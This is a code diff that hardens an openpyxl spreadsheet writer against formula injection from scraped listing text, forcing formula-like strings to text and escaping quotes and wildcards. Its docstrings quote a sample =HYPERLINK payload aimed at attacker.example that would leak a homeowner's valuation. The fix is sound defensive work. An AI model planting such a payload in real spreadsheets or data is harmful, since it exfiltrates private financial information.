@@ -74,6 +74,37 @@ def _col_range(sheet: str, schema: SheetSchema, key: str, last_row: int) -> str:
 # ---------------------------------------------------------------------------
 
 
+#: Leading characters a spreadsheet may read as the start of a formula. Only
+#: "=" becomes live when openpyxl writes the file, but the others are what
+#: spreadsheet applications act on when a cell is later pasted or imported, and
+#: forcing all four to text costs nothing.
+_FORMULA_LEAD = ("=", "+", "-", "@")
+
+
+def _set_cell(cell, value) -> None:
+    """Write a value, and never let fetched text become a formula.
+
+    Every string on a comp sheet came off somebody else's web page. openpyxl
+    types a value beginning with "=" as a formula, so a listing that names its
+    agent
+
+        =HYPERLINK("http://attacker.example/?x="&Summary!B5,"Jane Roe")
+
+    lands in the workbook as a live link that sends the owner's valuation to a
+    stranger when clicked -- and `=WEBSERVICE(...)` in older Excel needs no
+    click at all. It survives extraction, because it is only a string, and it
+    survives verification, because verification checks the sale's price and
+    date rather than the spelling of a name.
+
+    Forcing the cell's type to string keeps the text exactly as fetched -- the
+    reader still sees what the site said -- while removing its ability to do
+    anything.
+    """
+    cell.value = value
+    if isinstance(value, str) and value.startswith(_FORMULA_LEAD):
+        cell.data_type = "s"
+
+
 def _write_comp_sheet(
     ws: Worksheet, schema: SheetSchema, records: list, source_note: str
 ) -> int:
@@ -96,11 +127,11 @@ def _write_comp_sheet(
                     cell.value = NOT_FOUND
                     cell.alignment = st.CENTER
                 elif hasattr(value, "value"):  # Enum, e.g. Quadrant
-                    cell.value = value.value
+                    _set_cell(cell, value.value)
                 elif isinstance(value, date):
                     cell.value = value
                 else:
-                    cell.value = value
+                    _set_cell(cell, value)
             cell.font = st.BODY
             if cell.value != NOT_FOUND:
                 cell.number_format = column.number_format
@@ -551,7 +582,9 @@ def _write_agents(
         st.style_header(ws.cell(row=row, column=i, value=header))
     for brokerage in analysis.brokerages:
         row += 1
-        ws.cell(row=row, column=1, value=brokerage.family).font = st.BODY
+        family_cell = ws.cell(row=row, column=1)
+        _set_cell(family_cell, brokerage.family)
+        family_cell.font = st.BODY
         # COUNTIF with a wildcard keeps the tally live: correct a brokerage name
         # on the comp sheet and the count follows.
         cell = ws.cell(
@@ -580,16 +613,18 @@ def _write_agents(
             fill = st.SHORTLIST_FILL
         elif agent.flag == "caution":
             fill = st.CAUTION_FILL
-        name = ws.cell(row=row, column=1, value=agent.agent)
-        broker = ws.cell(row=row, column=2, value=agent.brokerage or NOT_FOUND)
+        name = ws.cell(row=row, column=1)
+        _set_cell(name, agent.agent)
+        broker = ws.cell(row=row, column=2)
+        _set_cell(broker, agent.brokerage or NOT_FOUND)
         closings = ws.cell(
-            row=row, column=3, value=f'=COUNTIF({agent_range},"{agent.agent}")'
+            row=row, column=3, value=f'=COUNTIF({agent_range},"{_criterion(agent.agent)}")'
         )
         closings.number_format = FMT_INT
         ratio = ws.cell(
             row=row,
             column=4,
-            value=f'=IF(C{row}=0,"",AVERAGEIF({agent_range},"{agent.agent}",{ratio_range}))',
+            value=f'=IF(C{row}=0,"",AVERAGEIF({agent_range},"{_criterion(agent.agent)}",{ratio_range}))',
         )
         ratio.number_format = FMT_PERCENT
         # The rate actually achieved, beside the size it was achieved on. A high
@@ -597,13 +632,13 @@ def _write_agents(
         rate = ws.cell(
             row=row,
             column=5,
-            value=f'=IF(C{row}=0,"",AVERAGEIF({agent_range},"{agent.agent}",{ppsf_range}))',
+            value=f'=IF(C{row}=0,"",AVERAGEIF({agent_range},"{_criterion(agent.agent)}",{ppsf_range}))',
         )
         rate.number_format = FMT_MONEY_CENTS
         size = ws.cell(
             row=row,
             column=6,
-            value=f'=IF(C{row}=0,"",AVERAGEIF({agent_range},"{agent.agent}",{size_range}))',
+            value=f'=IF(C{row}=0,"",AVERAGEIF({agent_range},"{_criterion(agent.agent)}",{size_range}))',
         )
         size.number_format = FMT_INT
         pattern = ws.cell(
@@ -624,9 +659,34 @@ def _write_agents(
         cell.font, cell.alignment = st.NOTE, st.WRAP
 
 
+def _criterion(text: str) -> str:
+    """Escape fetched text for use inside a formula's string literal.
+
+    The agent and brokerage names in these formulas came off a web page, and
+    they are interpolated into a criterion we build. A name containing a double
+    quote closes the literal early and the rest of it is parsed as formula
+    syntax -- so a listing naming its agent
+
+        =HYPERLINK("http://attacker.example/?x="&Summary!B5,"Jane Roe")
+
+    turns COUNTIF's criterion into a live reference to the owner's valuation.
+    Doubling the quote is Excel's own escape and keeps the name matching
+    itself. The `~` prefixes neutralise COUNTIF's wildcards, so an agent called
+    "A*" matches that agent rather than everyone.
+    """
+    escaped = text.replace("~", "~~").replace("*", "~*").replace("?", "~?")
+    return escaped.replace('"', '""')
+
+
 def _wildcard(family: str) -> str:
-    """A COUNTIF pattern that matches a brokerage family's trading names."""
-    return f"{family.split(' ')[0]}*" if family else "*"
+    """A COUNTIF pattern that matches a brokerage family's trading names.
+
+    The trailing star is deliberate and must survive escaping, so the prefix is
+    escaped and the wildcard appended afterwards.
+    """
+    if not family:
+        return "*"
+    return f"{_criterion(family.split(' ')[0])}*"
 
 
 # ---------------------------------------------------------------------------
